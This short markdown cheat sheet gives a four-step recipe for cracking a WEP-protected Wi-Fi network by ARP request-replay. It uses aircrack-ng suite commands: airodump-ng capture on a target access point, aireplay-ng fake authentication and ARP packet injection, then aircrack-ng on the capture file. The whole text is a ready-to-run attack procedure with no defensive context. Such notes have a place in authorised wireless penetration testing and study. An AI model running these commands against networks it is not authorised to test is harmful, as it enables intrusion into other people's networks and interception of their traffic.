- - -
# Method 1 🦁( ARP Request-Replay ):

#### Run Airodump-ng On Target AP : 

```sh
airodump-ng --bssid AA:AA:AA:AA:AA:AA --channel 69 --write arp-rr-test mon0
```

#### Do a Fakeauth : 

```sh
aireplay-ng  --fakeauth 0 -a <Target-MAC> -h <Our-MAC> mon0
```

#### Perform the ARP-replay : 

```sh
aireplay-ng  --arpreplay -b <Target-MAC> -h <Our-MAC> mon0
```

![Imgur](https://i.imgur.com/JZcl9Hj.png)

#### Now Run aircrack-ng : 

```sh
aircrack-ng arp-rr-test-01.cap 
```

![Imgur](https://i.imgur.com/ciJjJPA.png)

- - -
